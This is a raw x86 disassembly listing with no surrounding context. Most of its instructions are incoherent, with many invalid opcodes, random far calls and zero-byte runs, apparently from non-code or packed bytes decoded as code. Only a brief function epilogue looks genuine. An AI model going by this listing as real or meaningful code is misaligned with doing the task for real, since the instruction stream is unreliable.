  420fd2:	aad    0xc8
  420fd4:	inc    ecx
  420fd5:	jg     0x420fea
  420fd7:	xchg   esi,eax
  420fd8:	popa   
  420fd9:	dec    esp
  420fda:	outs   dx,BYTE PTR ds:[esi]
  420fdb:	cdq    
  420fdc:	push   esp
  420fdd:	std    
  420fde:	mov    ecx,DWORD PTR [edi]
  420fe0:	mov    ebp,0xe75275e5
  420fe5:	pop    esp
  420fe6:	scas   eax,DWORD PTR es:[edi]
  420fe7:	or     ah,bl
  420fe9:	jge    0x421008
  420feb:	mov    bh,BYTE PTR [esp+ebp*8]
  420fee:	push   eax
  420fef:	scas   al,BYTE PTR es:[edi]
  420ff0:	inc    esi
  420ff1:	stos   BYTE PTR es:[edi],al
  420ff2:	lock jmp 0x421039
  420ff5:	call   0x9474:0xc18eb4d9
  420ffc:	inc    esp
  420ffd:	es int3 
  420fff:	xchg   edi,eax
  421000:	ins    DWORD PTR es:[edi],dx
  421001:	mov    dl,0xe2
  421003:	sahf   
  421004:	dec    edi
  421005:	leave  
  421006:	xor    al,0x62
  421008:	popf   
  421009:	fdiv   QWORD PTR ds:[eax+0x38]
  42100d:	inc    eax
  42100e:	fmul   QWORD PTR [eax+0x8]
  421011:	or     DWORD PTR [eax],edx
  421013:	test   DWORD PTR [ebx+0x23],edi
  421016:	out    dx,ax
  421018:	lods   eax,DWORD PTR ds:[esi]
  421019:	sub    edx,DWORD PTR [esi-0x167d85e1]
  42101f:	dec    edx
  421020:	cmp    edi,0xfffffff9
  421023:	or     BYTE PTR [edx-0x17f5628e],dh
  421029:	jo     0x421031
  42102b:	inc    ebx
  42102c:	mov    ecx,0x7cd8eae1
  421031:	cmp    eax,DWORD PTR [eax+0x42]
  421034:	mov    ebx,0x7d67ddf6
  421039:	stos   BYTE PTR es:[edi],al
  42103a:	push   0x57
  42103c:	adc    BYTE PTR [ebx+eiz*8],0xc0
  421040:	jle    0x42104f
  421042:	lds    edx,FWORD PTR [edi-0x45]
  421045:	mov    ?,WORD PTR [edx]
  421047:	sbb    cl,ch
  421049:	cmp    BYTE PTR [edx],bl
  42104b:	ds (bad) 
  42104d:	cli    
  42104e:	inc    eax
  42104f:	mov    WORD PTR [ebx],fs
  421051:	das    
  421052:	jl     0x4210c1
  421054:	sbb    edx,ebx
  421056:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421057:	or     DWORD PTR [edi+0x15ab6fe4],0x43d149ed
  421061:	xchg   esi,eax
  421062:	add    BYTE PTR es:[edx+0x35060f8],0xb5
  42106a:	(bad)  
  42106b:	fisubr DWORD PTR [ebp+0x77b4edef]
  421071:	push   edi
  421072:	sub    eax,0x696be59b
  421077:	retf   
  421078:	lahf   
  421079:	lods   eax,DWORD PTR ds:[esi]
  42107a:	outs   dx,BYTE PTR ds:[esi]
  42107b:	in     al,0xff
  42107d:	sub    ah,BYTE PTR [ecx+0x1a]
  421080:	xchg   ecx,eax
  421081:	xor    ebp,DWORD PTR [edi-0x2fd93b16]
  421087:	leave  
  421088:	xlat   BYTE PTR ds:[ebx]
  421089:	test   ecx,edx
  42108b:	stc    
  42108c:	(bad)  
  42108d:	mov    ds:0xe89126b9,al
  421092:	jmp    0x421035
  421094:	cmp    cl,BYTE PTR [edi-0x5e]
  421097:	fadd   st(0),st
  421099:	sbb    eax,0x1172d0ef
  42109e:	and    eax,0x75cf4a41
  4210a3:	push   ebx
  4210a4:	push   ecx
  4210a5:	adc    al,dh
  4210a7:	or     eax,0x9a8d3aec
  4210ac:	xor    esp,esp
  4210ae:	out    dx,eax
  4210af:	mov    bh,0x7
  4210b1:	ret    
  4210b2:	sbb    DWORD PTR [ecx-0x7a9c767c],edx
  4210b8:	push   es
  4210b9:	xor    BYTE PTR [ecx+eax*1+0x45ce037b],ch
  4210c0:	lahf   
  4210c1:	popf   
  4210c2:	mov    al,ds:0x5666f72e
  4210c7:	adc    BYTE PTR [ebp+0x6091c6fe],0x11
  4210ce:	sahf   
  4210cf:	and    edx,DWORD PTR [esp+edx*2]
  4210d2:	jb     0x4210d1
  4210d4:	mov    ecx,0xa51d97cc
  4210d9:	ins    BYTE PTR es:[edi],dx
  4210da:	cld    
  4210db:	fidivr WORD PTR fs:0xfa18f907
  4210e2:	fcomi  st,st(3)
  4210e4:	dec    ebp
  4210e5:	fadd   DWORD PTR [ebp-0x1b]
  4210e8:	sar    BYTE PTR [eax-0x4d],1
  4210eb:	pushf  
  4210ec:	xchg   edx,eax
  4210ed:	(bad)  
  4210ee:	adc    ebx,edi
  4210f0:	or     ecx,DWORD PTR [eax]
  4210f2:	call   0x5912:0x8cfc124
  4210f9:	lea    ebp,[esi+0x31]
  4210fc:	pusha  
  4210fd:	add    edi,esp
  4210ff:	pop    ebx
  421100:	mov    al,BYTE PTR [ecx-0xd67ac4c]
  421106:	cs stos BYTE PTR es:[edi],al
  421108:	fmul   st,st(3)
  42110a:	jg     0x4210ba
  42110c:	popf   
  42110d:	mov    ds:0x2c3c6a73,al
  421112:	mov    ds:0x9f7c6b54,eax
  421117:	cdq    
  421118:	mov    edx,0xcaaa2146
  42111d:	div    ebp
  42111f:	loop   0x42113a
  421121:	daa    
  421122:	fld    DWORD PTR [esi+0x61942ce8]
  421128:	shl    BYTE PTR [edi-0x7396caa1],1
  42112e:	(bad)  
  42112f:	sbb    al,0x67
  421131:	jno    0x421169
  421133:	fisttp WORD PTR [ebx-0x7628fcc7]
  421139:	adc    DWORD PTR [ebx-0x37ccf7b3],ecx
  42113f:	add    ecx,esi
  421141:	jne    0x41ed92
  421147:	mov    ecx,DWORD PTR [ebp-0x8]
  42114a:	xor    ecx,eax
  42114c:	mov    eax,DWORD PTR [ebp+0x10]
  42114f:	add    ecx,esi
  421151:	mov    DWORD PTR [eax],ecx
  421153:	pop    edi
  421154:	pop    esi
  421155:	pop    ebx
  421156:	leave  
  421157:	ret    0xc
  42115a:	pop    ss
  42115b:	or     al,0x84
  42115d:	repz lahf 
  42115f:	sti    
  421160:	ja     0x42114e
  421162:	stos   BYTE PTR es:[edi],al
  421163:	mov    edx,0xf20888e2
  421168:	cli    
  421169:	adc    edi,DWORD PTR ds:0x610001cc
  42116f:	add    BYTE PTR [eax],al
  421171:	add    ch,al
  421173:	sbb    eax,0x9f03a95
  421178:	ret    
  421179:	xchg   ebx,eax
  42117a:	ss call 0x5ca5:0x846e5c06
  421182:	push   es
  421183:	mov    ebx,0x67ff1ffa
  421188:	sbb    eax,edx
  42118a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42118b:	cs std 
  42118d:	aam    0x5f
  42118f:	inc    esp
  421190:	pop    eax
  421191:	xlat   BYTE PTR ds:[ebx]
  421192:	or     eax,DWORD PTR [ebp+0x50]
  421195:	sub    BYTE PTR [ebx+0x6dfbbfcc],ah
  42119b:	dec    esi
  42119c:	dec    eax
  42119d:	add    eax,0x496b8aae
  4211a2:	lock mov ds:0x6f900a99,al
  4211a8:	popf   
  4211a9:	adc    bl,BYTE PTR [esi]
  4211ab:	ja     0x4211d7
  4211ad:	pop    esp
  4211ae:	mov    esi,0x1a83e3fd
  4211b3:	das    
  4211b4:	and    DWORD PTR gs:[esp+ebx*4+0x1d973e7b],0xd
  4211bd:	sbb    DWORD PTR [ecx*1-0x5ffa1f58],esi
  4211c4:	mov    esi,DWORD PTR [ebx]
  4211c6:	dec    esp
  4211c7:	(bad)  [eax+ebp*4]
  4211ca:	pop    edi
  4211cb:	gs mov esp,0xfeb33689
  4211d1:	xchg   BYTE PTR fs:[eax],al
  4211d4:	add    BYTE PTR [eax],al
  4211d6:	add    BYTE PTR [eax],al
  4211d8:	add    BYTE PTR [eax],al
  4211da:	shr    DWORD PTR [esp+edx*1],1
  4211dd:	adc    edi,ebp
  4211df:	cmp    edx,edi
  4211e1:	out    dx,al
  4211e2:	pop    edi
  4211e3:	xchg   bx,ax
  4211e5:	push   0x34e1bd4d
  4211ea:	sahf   
  4211eb:	int3   
  4211ec:	add    DWORD PTR [eax],eax
  4211ee:	popa   
  4211ef:	add    BYTE PTR [eax],al
  4211f1:	add    bl,al
  4211f3:	mov    bl,0xe0
  4211f6:	call   0xb3fb:0x665edca4
  4211fd:	inc    ebx
  4211fe:	jbe    0x421258
  421200:	cwde   
  421201:	addr16 push ebp
  421203:	mov    ah,0xd0
  421205:	test   eax,0x4a73130c
  42120a:	push   ss
  42120b:	and    eax,0x1d19edc
  421210:	mov    bl,0x48
  421212:	(bad)  
  421213:	ja     0x42125f
  421215:	je     0x42126f
  421217:	retf   0x7ee6
  42121a:	mov    esp,DWORD PTR [ebp+0x5a]
  42121d:	pop    es
  42121e:	sbb    eax,0xe31104b4
  421223:	xor    ebx,eax
  421225:	mov    eax,0x1c01089d
  42122a:	out    dx,eax
  42122b:	mov    bl,BYTE PTR [ebx+0x2a]
  42122e:	xchg   edx,eax
  42122f:	mov    al,0x40
  421231:	pop    edx
  421232:	xchg   ebp,eax
  421233:	xor    BYTE PTR [ecx],0xcb
  421236:	aas    
  421237:	xchg   edx,eax
  421238:	out    dx,al
  421239:	xor    al,0xe9
  42123b:	stos   BYTE PTR es:[edi],al
  42123c:	stos   BYTE PTR es:[edi],al
  42123d:	pop    ds
  42123e:	les    esp,FWORD PTR [ebx+ebp*1+0x45]
  421242:	cmc    
  421243:	ret    0x47b6
  421246:	hlt    
  421247:	inc    ebx
  421248:	mov    ebp,0xdf3e7935
  42124d:	loope  0x4212a7
  42124f:	xchg   DWORD PTR [edx+0x13a3],esi
  421255:	add    BYTE PTR [eax],al
  421257:	add    BYTE PTR [eax],al
  421259:	add    BYTE PTR [edi],bl
  42125b:	sub    esp,DWORD PTR [eax-0x60404bc1]
  421261:	sub    eax,esi
  421263:	add    BYTE PTR [edi+eax*2-0x5c6b8480],0xff
  42126b:	int3   
  42126c:	add    DWORD PTR [eax],eax
  42126e:	popa   
  42126f:	add    BYTE PTR [eax],al
  421271:	add    ch,bl
  421273:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421274:	and    DWORD PTR [ecx+edi*2],ebp
  421277:	push   cs
  421278:	mov    ds:0x54ee78a1,eax
  42127d:	mov    eax,0x22f34937
  421282:	test   BYTE PTR [ecx],ch
  421284:	push   0xffffff80
  421286:	mov    ebx,DWORD PTR [eax]
  421288:	push   es
  421289:	xchg   ebp,eax
  42128a:	lock test al,0x45
  42128d:	jmp    0xcfafb1b9
  421292:	add    al,BYTE PTR [edi]
  421294:	xor    eax,0x383f15e5
  421299:	jecxz  0x4212d5
  42129b:	retf   
  42129c:	gs jmp 0x68e6dd45
  4212a2:	repz ret 
  4212a4:	fcomi  st,st(3)
  4212a6:	test   BYTE PTR [edx],bh
  4212a8:	test   bl,0x97
  4212ab:	mov    esi,0xcd4c07f0
  4212b0:	bswap  edi
  4212b2:	push   0x40b1dc4
  4212b7:	pop    esi
  4212b8:	int    0xc4
  4212ba:	daa    
  4212bb:	jno    0x421332
  4212bd:	inc    eax
  4212be:	adc    BYTE PTR [edi+0x185e42f3],ah
  4212c4:	mov    eax,0x7b7e29f4
  4212c9:	mov    esi,0xb472ec77
  4212ce:	jg     0x421333
  4212d0:	es push ecx
  4212d2:	or     al,0x0
  4212d4:	add    BYTE PTR [eax],al
  4212d6:	add    BYTE PTR [eax],al
  4212d8:	add    BYTE PTR [eax],al
  4212da:	das    
  4212db:	and    al,0xf0
  4212dd:	aam    0xfb
  4212df:	aam    0x2f
  4212e1:	jmp    FWORD PTR [esi+0x33]
  4212e4:	je     0x42129c
  4212e6:	jecxz  0x42133a
  4212e8:	mov    al,ds:0x1cd6064
  4212ed:	add    BYTE PTR [ecx+0x0],ah
  4212f0:	add    BYTE PTR [eax],al
  4212f2:	adc    eax,0x674ecfe9
  4212f7:	sub    al,0x58
  4212f9:	pop    ecx
  4212fa:	pop    ds
  4212fb:	jg     0x42136e
  4212fd:	xor    DWORD PTR [esi+0x7081b1a2],ebx
  421303:	gs test eax,0x66cba872
  421309:	push   ebx
  42130a:	xchg   ebx,eax
  42130b:	(bad)  
  42130c:	fdiv   DWORD PTR [eax]
  42130e:	stc    
  42130f:	cld    
  421310:	inc    ebx
  421311:	inc    ebx
  421312:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421313:	inc    esi
  421314:	pusha  
  421315:	outs   dx,BYTE PTR ds:[esi]
  421316:	ins    BYTE PTR es:[edi],dx
  421317:	dec    ebx
  421318:	ret    0x842a
  42131b:	xor    al,bh
  42131d:	sub    al,0x32
  42131f:	popa   
  421320:	pop    ds
  421321:	sub    ebp,edx
  421323:	jne    0x4212bd
  421325:	or     BYTE PTR [ebx-0x42314027],dh
  42132b:	xchg   ebp,eax
  42132c:	xchg   edx,eax
  42132d:	fnsave [ebx+0x48]
  421330:	pop    ecx
  421331:	xor    BYTE PTR [esi+ebx*8-0x1c],al
  421335:	jg     0x421347
  421337:	daa    
  421338:	into   
  421339:	fsubr  QWORD PTR [edi+0x64]
  42133c:	jge    0x4212e2
  42133e:	in     al,dx
  42133f:	push   ds
  421340:	inc    ecx
  421341:	xchg   ebx,eax
  421342:	in     al,0x6b
  421344:	mov    eax,0x900c5ff8
  421349:	inc    eax
  42134a:	jecxz  0x4213be
  42134c:	mov    ah,0x23
  42134e:	mov    ebx,0xf9e4b497
  421353:	add    BYTE PTR [eax],al
  421355:	add    BYTE PTR [eax],al
  421357:	add    BYTE PTR [eax],al
  421359:	add    dl,cl
  42135b:	mov    al,ds:0xdf7e4d76
  421360:	sti    
  421361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421362:	mov    bh,0x83
  421364:	dec    edi
  421365:	mov    ds:0xe2d973ba,al
  42136a:	ror    ebp,0x1
  42136d:	add    BYTE PTR [ecx+0x0],ah
  421370:	add    BYTE PTR [eax],al
  421372:	shr    BYTE PTR [edx],0xef
  421375:	outs   dx,BYTE PTR ds:[esi]
  421376:	adc    al,0xe
  421378:	mov    ds:0x474f41ab,al
  42137d:	mov    dh,0x42
  42137f:	jae    0x4213c2
  421381:	dec    ebx
  421382:	in     al,dx
  421383:	mov    ecx,DWORD PTR [eax+esi*4-0x2c38ac64]
  42138a:	xor    eax,0xb7151892
  42138f:	xor    eax,DWORD PTR [ebp+0x5f]
  421392:	ret    0x750e
  421395:	mov    ch,0x56
  421397:	mov    ecx,0x1702dfd7
  42139c:	jo     0x421357
  42139e:	sub    ebp,esp
  4213a0:	ins    BYTE PTR es:[edi],dx
  4213a1:	retf   0xf6cf
  4213a4:	mov    dh,0x36
  4213a6:	les    edx,FWORD PTR [edi+0x1b]
  4213a9:	lea    esp,[edx+0x5a]
  4213ac:	inc    ecx
  4213ad:	lods   al,BYTE PTR ds:[esi]
  4213ae:	dec    ecx
  4213af:	dec    esp
  4213b0:	push   esp
  4213b1:	ins    DWORD PTR es:[edi],dx
  4213b2:	push   cs
  4213b3:	cmp    edx,DWORD PTR [eax+0x5ee2e024]
  4213b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213ba:	aas    
  4213bb:	das    
  4213bc:	add    ah,BYTE PTR [edi]
  4213be:	stos   BYTE PTR es:[edi],al
  4213bf:	test   eax,0x841e89c3
  4213c4:	jo     0x42134c
  4213c6:	push   ss
  4213c7:	push   ebp
  4213c8:	and    esp,DWORD PTR [edx-0x16af4aa9]
  4213ce:	(bad)  
  4213cf:	daa    
  4213d0:	stos   DWORD PTR es:[edi],eax
  4213d1:	aad    0xf
  4213d3:	add    BYTE PTR [eax],al
  4213d5:	add    BYTE PTR [eax],al
  4213d7:	add    BYTE PTR [eax],al
  4213d9:	add    dh,al
  4213db:	out    dx,al
  4213dc:	lods   al,BYTE PTR ds:[esi]
  4213dd:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  4213e4:	stc    
  4213e5:	stc    
  4213e6:	(bad)  
  4213e7:	loopne 0x421428
  4213e9:	lock and cl,dh
  4213ec:	add    DWORD PTR [eax],eax
  4213ee:	popa   
  4213ef:	add    BYTE PTR [eax],al
  4213f1:	add    BYTE PTR [ebx-0x7d],dh
  4213f4:	sub    dl,BYTE PTR [esi+eax*2+0x1e]
  4213f8:	jb     0x421438
  4213fa:	push   ebx
  4213fb:	jno    0x4213a1
  4213fd:	mov    fs,WORD PTR [eax-0xf]
  421400:	jbe    0x4213e0
  421402:	or     al,0xde
  421404:	lds    esp,FWORD PTR [eax+0x4ea2022a]
  42140a:	gs adc eax,0xa6a5f80e
  421410:	push   esi
  421411:	inc    esp
  421412:	inc    esi
  421413:	push   0x90ee494d
  421418:	fcom   QWORD PTR [ebp+0x78]
  42141b:	inc    dl
  42141d:	xor    al,0xe1
  42141f:	fld    st(1)
  421421:	dec    ecx
  421422:	scas   al,BYTE PTR es:[edi]
  421423:	push   ecx
  421424:	jecxz  0x421483
  421426:	xchg   edi,eax
  421427:	in     al,0x43
  421429:	xchg   esi,eax
  42142a:	imul   ecx,DWORD PTR [esi],0xf9a91c1b
  421430:	fidivr DWORD PTR [ecx]
  421432:	lea    ecx,[edx]
  421434:	je     0x4213ca
  421436:	cmp    dl,BYTE PTR ds:0xab7f979b
  42143c:	sbb    esp,esi
  42143e:	iret   
  42143f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421440:	fwait
  421441:	in     al,dx
  421442:	jns    0x421461
  421444:	mov    ch,BYTE PTR [edi+0x5a1561d3]
  42144a:	adc    eax,0xa09622fb
  42144f:	or     eax,0x2ee87
  421454:	add    BYTE PTR [eax],al
  421456:	add    BYTE PTR [eax],al
  421458:	add    BYTE PTR [eax],al
  42145a:	push   edx
  42145b:	xor    al,0x40
  42145d:	gs data16 jne 0x4214d8
  421461:	aaa    
  421462:	push   0x526a4e09
  421467:	mov    ch,0x24
  421469:	pushf  
  42146a:	or     esi,0x1
  42146d:	add    BYTE PTR [ecx+0x0],ah
  421470:	add    BYTE PTR [eax],al
  421472:	mul    DWORD PTR [edx-0x4b92884e]
  421478:	(bad)  
  421479:	aam    0xe8
  42147b:	mov    bh,0xfe
  42147d:	mov    cl,cl
  42147f:	in     eax,0xa2
  421481:	push   ebx
  421482:	cmp    DWORD PTR [edx],0x1c
  421485:	or     eax,0x6f827b2
  42148a:	or     ch,dl
  42148c:	pop    edx
  42148d:	rol    DWORD PTR [ebp+0x459f7db3],0xa1
  421494:	sub    DWORD PTR [esi],eax
  421496:	sub    eax,DWORD PTR [edi]
  421498:	int    0x33
  42149a:	xor    DWORD PTR [esi-0xf2e1d39],0x79
  4214a1:	xchg   esp,eax
  4214a2:	add    edx,DWORD PTR [ebp+edi*2-0x6b8807f8]
  4214a9:	push   eax
  4214aa:	shr    BYTE PTR [esi],0xc2
  4214ad:	jp     0x42145a
  4214af:	xor    ebx,edx
  4214b1:	sub    cl,BYTE PTR [edx]
  4214b3:	cdq    
  4214b4:	mov    dl,BYTE PTR [edx+esi*8]
  4214b7:	cmp    eax,0x3155d4c2
  4214bc:	jle    0x4214c1
  4214be:	mov    ah,0x13
  4214c0:	cmp    eax,0x3b9f6adc
  4214c5:	loopne 0x421454
  4214c7:	or     DWORD PTR [edi+0x6b882c4c],esp
  4214cd:	nop
  4214ce:	sbb    DWORD PTR [edi-0x2c],ebp
  4214d1:	ret    
  4214d2:	sbb    al,0x0
  4214d4:	add    BYTE PTR [eax],al
  4214d6:	add    BYTE PTR [eax],al
  4214d8:	add    BYTE PTR [eax],al
  4214da:	adc    bh,BYTE PTR [edx-0x19073928]
  4214e0:	push   ds
  4214e1:	(bad)  
  4214e2:	adc    bl,dh
  4214e4:	cwde   
  4214e5:	out    dx,al
  4214e6:	frstor [esi]
  4214e8:	adc    DWORD PTR [ebx],eax
  4214ea:	adc    al,0xe1
  4214ec:	add    DWORD PTR [eax],eax
  4214ee:	popa   
  4214ef:	add    BYTE PTR [eax],al
  4214f1:	add    BYTE PTR [esi-0x5],ch
  4214f4:	pop    ecx
  4214f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214f6:	pop    ecx
  4214f7:	or     BYTE PTR [ebp-0x2f963067],ah
  4214fd:	sbb    BYTE PTR [edx+0x5a],ch
  421500:	pop    edi
  421501:	adc    bh,BYTE PTR [ebx+eiz*2]
  421504:	shr    BYTE PTR [eax+0xf],cl
  421507:	inc    ecx
  421508:	or     eax,0xaa4459a2
  42150d:	adc    al,BYTE PTR [esi+0x61689aa2]
  421513:	call   0xa16c4a75
  421518:	or     al,0xbf
  42151a:	xchg   ebp,eax
  42151b:	jmp    0x42158a
  42151d:	push   ebx
  42151e:	out    0x77,al
  421520:	sbb    DWORD PTR [ebx-0x25364a7a],0x9
  421527:	iret   
  421528:	dec    ecx
  421529:	ds jb  0x421599
  42152c:	out    0xd,al
  42152e:	lds    ebx,FWORD PTR [ebx+edi*8+0x3bf1d72e]
  421535:	mov    DWORD PTR [ebp+0x2b4c963],eax
  42153b:	sbb    edi,DWORD PTR [ebp-0xd4d6190]
  421541:	xchg   bl,dl
  421543:	fld    QWORD PTR [esi]
  421545:	aaa    
  421546:	sub    al,0xc4
  421548:	inc    esp
  421549:	lds    esp,FWORD PTR [edx]
  42154b:	loopne 0x421544
  42154d:	ja     0x42154e
  42154f:	arpl   WORD PTR [ebx],cx
  421551:	push   ds
  421552:	imul   eax,DWORD PTR [eax],0x0
  421555:	add    BYTE PTR [eax],al
  421557:	add    BYTE PTR [eax],al
  421559:	add    BYTE PTR [ecx+0x46],cl
  42155c:	sub    BYTE PTR [eax],dh
  42155e:	das    
  42155f:	jle    0x4215ba
  421561:	jg     0x421529
  421563:	imul   esi,eax,0xffffffd5
  421566:	cmp    ch,ah
  421568:	fbld   TBYTE PTR [esi+0x1e175]
  42156e:	popa   
  42156f:	add    BYTE PTR [eax],al
  421571:	add    BYTE PTR [edx],dh
  421573:	loope  0x421509
  421575:	pop    eax
  421576:	jbe    0x4215d6
  421578:	ror    BYTE PTR [ebx],cl
  42157a:	xchg   BYTE PTR [esi-0x2c],dl
  42157d:	push   ds
  42157e:	jne    0x42152d
  421580:	int    0xe6
  421582:	and    al,0xb9
  421584:	repz pop edx
  421586:	das    
  421587:	mov    DWORD PTR ds:0x6f7ca007,ebx
  42158d:	sub    BYTE PTR [ebp+0x23],ch
  421590:	arpl   WORD PTR [ebx+esi*4+0x6f],bx
  421594:	mov    DWORD PTR [ecx+0x4d],0xf2055ac3
  42159b:	mov    ch,0x4c
  42159d:	leave  
  42159e:	dec    edx
  42159f:	cpuid  
  4215a1:	test   BYTE PTR [ebx+ecx*1-0x486adfe2],bl
  4215a8:	cmp    BYTE PTR [esi-0x35],al
  4215ab:	scas   eax,DWORD PTR es:[edi]
  4215ac:	push   0xffffff95
  4215ae:	jne    0x421533
  4215b0:	aad    0xcb
  4215b2:	mov    ecx,0x6e68b824
  4215b7:	push   ebp
  4215b8:	icebp  
  4215b9:	cli    
  4215ba:	es sub eax,0xfe939f4d
  4215c0:	nop
  4215c1:	mov    al,ds:0xaffe3194
  4215c6:	fnstenv [edx+eiz*2]
  4215c9:	in     al,dx
  4215ca:	dec    ebx
  4215cb:	mov    ebx,0x82f80110
  4215d0:	mov    ds:0x94f9,eax
  4215d5:	add    BYTE PTR [eax],al
  4215d7:	add    BYTE PTR [eax],al
  4215d9:	add    BYTE PTR [edi-0x3a],ah
  4215dc:	and    dh,dh
  4215de:	mov    eax,ds:0xe7d7f7f6
  4215e3:	mov    eax,0x3488da72
  4215e8:	imul   eax,DWORD PTR [eax],0x1e1d6
  4215ee:	popa   
  4215ef:	add    BYTE PTR [eax],al
  4215f1:	add    BYTE PTR [edx],bh
  4215f3:	adc    bh,BYTE PTR [esi-0x4]
  4215f6:	out    0x98,eax
  4215f8:	push   edx
  4215f9:	mov    ebx,0xb56efb23
  4215fe:	popa   
  4215ff:	mov    ds:0xf0df360f,eax
  421604:	dec    ebx
  421605:	(bad)  
  421606:	shl    DWORD PTR [eax+eax*2+0x28],cl
  42160a:	adc    bl,BYTE PTR [edx-0x5a]
  42160d:	sub    BYTE PTR [edx],ah
  42160f:	add    al,0xb8
  421611:	into   
  421612:	(bad)  
  421614:	cmp    BYTE PTR [edx+0x4353647b],ah
  42161a:	dec    edi
  42161b:	xchg   esi,eax
  42161c:	js     0x42162e
  42161e:	je     0x421600
  421620:	imul   edx,esi,0x9c0dd45
  421626:	call   0x1d66:0x79c77ca5
  42162d:	jns    0x421640
  42162f:	nop
  421630:	mov    ds:0x91fbbdb5,eax
  421635:	rcl    DWORD PTR [ecx],1
  421637:	xchg   esp,eax
  421638:	dec    ebp
  421639:	xchg   ecx,eax
  42163a:	fisttp WORD PTR [ebx-0x41581cf9]
  421640:	inc    ecx
  421641:	xchg   ebp,eax
  421642:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421643:	test   DWORD PTR [eax-0x21],edi
  421646:	gs test al,0x96
  421649:	xor    DWORD PTR [esi],eax
  42164b:	aad    0x9b
  42164d:	test   BYTE PTR [edi+0x191ec7a7],cl
  421653:	add    BYTE PTR [eax],al
  421655:	add    BYTE PTR [eax],al
  421657:	add    BYTE PTR [eax],al
  421659:	add    bl,al
  42165b:	or     eax,0xefee66a6
  421660:	ret    
  421661:	lods   eax,DWORD PTR ds:[esi]
  421662:	sub    al,0xb8
  421664:	mov    ds:0x147ea147,eax
  421669:	(bad)  
  42166a:	aaa    
  42166b:	loop   0x42166e
  42166d:	add    BYTE PTR [ecx+0x0],ah
  421670:	add    BYTE PTR [eax],al
  421672:	adc    edx,ecx
  421674:	inc    esp
  421675:	lods   al,BYTE PTR ds:[esi]
  421676:	push   ds
  421677:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421678:	push   eax
  421679:	dec    ecx
  42167a:	dec    ebp
  42167b:	sub    edi,esp
  42167d:	std    
  42167e:	test   eax,0xce5ea7c0
  421683:	mov    WORD PTR [esi],ss
  421685:	shl    BYTE PTR [ecx+0x4cd3e252],1
  42168b:	add    edx,DWORD PTR [ecx+0x26]
  42168e:	out    dx,al
  42168f:	test   al,0x3
  421691:	xchg   esp,esp
  421693:	jmp    0x53fcff7
  421698:	not    BYTE PTR [esi+0x61]
  42169b:	stc    
  42169c:	popa   
  42169d:	or     BYTE PTR ds:0xf862abb,ch
  4216a3:	daa    
  4216a4:	mov    es,WORD PTR [eax+0x31]
  4216a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216a8:	cmp    dh,BYTE PTR [edi]
  4216aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216ab:	xchg   ebp,eax
  4216ac:	xlat   BYTE PTR ds:[ebx]
  4216ad:	(bad)  
  4216ae:	mov    bh,0x63
  4216b0:	rol    DWORD PTR [edx],1
  4216b2:	pop    ds
  4216b3:	xchg   ebp,eax
  4216b4:	hlt    
  4216b5:	mov    cl,0x1
  4216b7:	fidiv  WORD PTR [esi]
  4216b9:	sti    
  4216ba:	mov    cl,0xa8
  4216bc:	aas    
  4216bd:	add    dh,BYTE PTR [ecx]
  4216bf:	adc    al,0x5c
  4216c1:	ret    0xea01
  4216c4:	dec    ebp
  4216c5:	cmp    eax,0xd857b631
  4216ca:	adc    cl,al
  4216cc:	jecxz  0x421694
  4216ce:	call   0x0:0x326ff9cd
  4216d5:	add    BYTE PTR [eax],al
  4216d7:	add    BYTE PTR [eax],al
  4216d9:	add    cl,bl
  4216db:	ret    0x4905
  4216de:	pop    ds
  4216df:	iret   
  4216e0:	fst    st(2)
  4216e2:	enter  0xf86f,0xd2
  4216e6:	daa    
  4216e7:	pushf  
  4216e8:	or     eax,0x1e29823
  4216ed:	add    BYTE PTR [edi+0x0],dl
  4216f0:	add    BYTE PTR [eax],al
  4216f2:	into   
  4216f3:	pop    ebp
  4216f4:	or     esp,DWORD PTR [edi+0x16780a0d]
  4216fa:	jne    0x421756
  4216fc:	addr16 add ebp,edi
  4216ff:	mov    edi,0xe7171b10
  421704:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421706:	mov    DWORD PTR ds:0x3754387,eax
  42170c:	lods   eax,DWORD PTR ds:[esi]
  42170d:	push   esi
  42170e:	adc    al,0xa2
  421710:	jge    0x4216ab
  421712:	inc    esp
  421713:	and    DWORD PTR [ecx+0x141ccc3e],ecx
  421719:	push   0xe674cdc1
  42171e:	test   eax,0x73bdabf1
  421723:	cmp    BYTE PTR [ebx-0x7a883475],bl
  421729:	lods   al,BYTE PTR ds:[esi]
  42172a:	xchg   DWORD PTR [edi],edi
  42172c:	lods   eax,DWORD PTR ds:[esi]
  42172d:	out    0xb,eax
  42172f:	clc    
  421730:	pop    ecx
  421731:	ret    0xe465
  421734:	sub    ch,BYTE PTR [esi+0x5693b0f5]
  42173a:	or     ecx,ebp
  42173c:	cld    
  42173d:	push   edi
  42173e:	cmp    dl,ch
  421740:	add    cl,cl
  421742:	cmc    
  421743:	and    eax,0x5ffe5e9a
  421748:	sldt   WORD PTR [eax]
  42174b:	nop
  42174c:	inc    edx
  42174d:	add    BYTE PTR [eax+edx*4],al
  421750:	inc    edx
  421751:	add    BYTE PTR [eax],cl
  421753:	nop
  421754:	inc    edx
  421755:	add    BYTE PTR [eax+edx*4],cl
  421758:	inc    edx
  421759:	add    BYTE PTR [eax],dl
  42175b:	nop
  42175c:	inc    edx
  42175d:	add    BYTE PTR [eax+edx*4],dl
  421760:	inc    edx
  421761:	add    BYTE PTR [eax],bl
  421763:	nop
  421764:	inc    edx
  421765:	add    BYTE PTR [eax+edx*4],bl
  421768:	inc    edx
  421769:	add    BYTE PTR [eax],al
  42176b:	mov    al,ds:0xa0040042
  421770:	inc    edx
  421771:	add    BYTE PTR [eax],cl
  421773:	mov    al,ds:0xa00c0042
  421778:	inc    edx
  421779:	add    BYTE PTR [eax],dl
